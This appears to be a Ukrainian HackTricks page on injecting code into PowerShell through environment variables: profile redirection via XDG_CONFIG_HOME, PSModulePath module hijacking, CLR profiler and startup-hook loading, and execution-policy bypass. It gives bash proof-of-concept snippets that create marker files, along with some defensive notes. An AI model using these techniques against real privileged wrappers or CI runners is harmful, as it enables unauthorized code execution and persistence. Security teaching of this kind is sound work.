# Ін’єкція застосунків PowerShell у macOS

{{#include ../../../banners/hacktricks-training.md}}

PowerShell є кросплатформним: той самий бінарний файл `pwsh` працює в macOS, Linux і Windows, а сам PowerShell є застосунком **.NET (Core)**. Це дає зловмиснику, який контролює середовище запуску `pwsh`, кілька примітивів виконання коду через змінні середовища, що однаково працюють у всіх трьох ОС, а також кілька таких, що працюють лише у Windows. Усі вони виконуються **до** (або замість) `-Command`/`-File`, які жертва мала намір запустити, що робить їх ідеальними для атак на привілейовані обгортки, завдання cron/`launchd`/systemd і CI runners, які запускають `pwsh` через shell із успадкованим середовищем.

## `XDG_CONFIG_HOME` і профілі PowerShell

У macOS і Linux PowerShell використовує шляхи конфігурації XDG і виконує скрипти профілів користувача під час запуску `pwsh`. Перенаправлення `XDG_CONFIG_HOME` змінює каталог, що містить `powershell/profile.ps1` і специфічний для console host файл `powershell/Microsoft.PowerShell_profile.ps1`; тому контрольований файл у цьому каталозі може виконатися до payload, переданого через `-Command`.<sup>[[1]](#references)[[2]](#references)</sup>
```bash
mkdir -p /tmp/ps-config/powershell
cat >/tmp/ps-config/powershell/Microsoft.PowerShell_profile.ps1 <<'PS1'
New-Item -ItemType File -Path /tmp/powershell-profile-executed -Force | Out-Null
PS1

XDG_CONFIG_HOME=/tmp/ps-config pwsh -Command '$true'
```
Це стосується PowerShell 6+ (`pwsh`) на платформах, відмінних від Windows; Windows PowerShell використовує інші розташування профілів. `pwsh -NoProfile` вимикає завантаження профілю. Також перевіряйте `HOME` і назви профілів, специфічні для хоста, оскільки інші PowerShell hosts можуть вибирати інші скрипти.

> [!TIP]
> У **Windows** шляхи до профілів визначаються на основі `$HOME` / відомої папки *Documents* (наприклад, `Documents\PowerShell\Microsoft.PowerShell_profile.ps1` для `pwsh`, `Documents\WindowsPowerShell\...` для Windows PowerShell), тому вплив на `HOME`/`USERPROFILE` — або простий запис у цей файл — є еквівалентним primitive.

## `PSModulePath` module auto-loading hijack

Починаючи з PowerShell 3.0, **module auto-loading** автоматично імпортує модуль, коли вперше використовується команда, яку він експортує (викликається, передається до `Get-Command` або вибирається за допомогою tab-completion). PowerShell рекурсивно шукає в кожному каталозі, зазначеному в **`$Env:PSModulePath`**, файли `.psd1`/`.psm1`, а в non-Windows успадкований процесом `PSModulePath` використовується як є. Отже, якщо ви можете **додати каталог на початок `PSModulePath`**, ви можете розмістити модуль, який або відповідає команді, що викликається скриптом жертви, або назві модуля, який скрипт передає до `Import-Module`, — і код у scope модуля виконається під час імпорту.<sup>[[3]](#references)</sup>

Оскільки розділення команд PowerShell відбувається в порядку *Alias → Function → Cmdlet → Application*, **function**, експортована вашим модулем, може перехопити вбудований cmdlet, який використовує ціль (наприклад, `Get-ChildItem`), тому вам навіть не потрібно, щоб жертва імпортувала щось за назвою.
```bash
# Attacker-controlled module dir prepended to PSModulePath
mkdir -p /tmp/evil/Hijack
cat >/tmp/evil/Hijack/Hijack.psm1 <<'PS1'
# Top-level module code runs at import time
New-Item -ItemType File -Path /tmp/psmodulepath-executed -Force | Out-Null
function Invoke-Report { 'hijacked' }   # shadows whatever the victim calls
Export-ModuleMember -Function Invoke-Report
PS1
cat >/tmp/evil/Hijack/Hijack.psd1 <<'PS1'
@{ ModuleVersion = '1.0'; RootModule = 'Hijack.psm1'; FunctionsToExport = @('Invoke-Report') }
PS1

# Victim runs pwsh with an inherited/attacker-influenced PSModulePath and calls Invoke-Report
PSModulePath="/tmp/evil:$PSModulePath" pwsh -Command 'Invoke-Report'
test -e /tmp/psmodulepath-executed && echo 'PSModulePath auto-load executed'
```
У **Windows** діє те саме правило (шляхи, розділені символом `;`); `PSModulePath` також отримує значення з `HKCU:\Environment` і `HKLM:\...\Session Manager\Environment`, тому доступне для запису значення в області користувача також є primitive persistence. Автоматичне завантаження можна вимкнути за допомогою `$PSModuleAutoloadingPreference = 'None'`, а `pwsh -NoProfile` **не** перешкоджає цьому.

## CLR profiler injection (`CORECLR_PROFILER` / `COR_PROFILER`)

`pwsh` працює на .NET Core, тому **CLR profiling API** завантажує DLL/`.so`/`.dylib` атакувальника в процес під час запуску виключно з environment — без підпису та без реєстрації COM, оскільки змінні `*_PATH` мають пріоритет над registry. `DllMain`/entry point бібліотеки profiler виконується всередині процесу PowerShell, що є класичною технікою in-process code-execution і persistence (MITRE ATT&CK **T1574.012**).<sup>[[4]](#references)</sup>
```bash
# .NET Core / .NET 5+ (pwsh) — cross-platform. Use .so on Linux, .dylib on macOS, .dll on Windows.
CORECLR_ENABLE_PROFILING=1 \
CORECLR_PROFILER='{cf0d821e-299b-5307-a3d8-b283c03916db}' \
CORECLR_PROFILER_PATH=/tmp/evil_profiler.so \
pwsh -Command '$true'
```
- На **.NET 8+** змінні також можуть використовувати новіший префікс `DOTNET_` (`DOTNET_EnableDiagnostics=1`, `DOTNET_ENABLE_PROFILING=1`, `DOTNET_PROFILER`, `DOTNET_PROFILER_PATH`); `CORECLR_*` зберігається для зворотної сумісності.
- У **Windows PowerShell 5.1** (`powershell.exe`, .NET Framework) еквівалентна трійка: **`COR_ENABLE_PROFILING=1`**, **`COR_PROFILER={CLSID}`** і **`COR_PROFILER_PATH=C:\evil.dll`**.

DLL profiler має бути лише коректною бібліотекою COM/ICorProfilerCallback (або просто виконувати свою роботу з `DllMain`). Захисні launchers мають видаляти `COR_*`/`CORECLR_*`/`DOTNET_*` із привілейованих середовищ.

## `DOTNET_STARTUP_HOOKS` (hook .NET до `Main`)

Оскільки `pwsh` є застосунком .NET Core, **`DOTNET_STARTUP_HOOKS`** вказує на managed assembly, у якому `StartupHook.Initialize()` синхронно запускається до `Main` host — тобто до запуску самого PowerShell. Це найчистіший managed-code primitive, спільний для всіх інших застосунків .NET:

{{#ref}}
macos-.net-applications-injection.md
{{#endref}}

## `PSExecutionPolicyPreference` (обхід контролю Windows)

У Windows встановлення змінної середовища **`$Env:PSExecutionPolicyPreference`** (наприклад, у `Bypass` або `Unrestricted`) перевизначає ефективну Execution Policy для цього процесу — саме це записує `Set-ExecutionPolicy -Scope Process`. Сама по собі вона не виконує code execution, але усуває обмеження «непідписані scripts блокуються», що часто є відсутньою ланкою для фактичного запуску одного з наведених вище primitives (встановленого profile / module). Execution Policy існує лише у Windows і ніколи не була security boundary.<sup>[[5]](#references)</sup>

## References

- [1] [Змінні середовища PowerShell і шляхи XDG](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_environment_variables)
- [2] [Профілі PowerShell](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_profiles)
- [3] [about_PSModulePath і автоматичне завантаження module](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_psmodulepath)
- [4] [Налаштування debugging і profiling .NET (змінні profiler CORECLR_/DOTNET_)](https://learn.microsoft.com/en-us/dotnet/core/runtime-config/debugging-profiling)
- [5] [about_Execution_Policies (PSExecutionPolicyPreference)](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.core/about/about_execution_policies)
{{#include ../../../banners/hacktricks-training.md}}
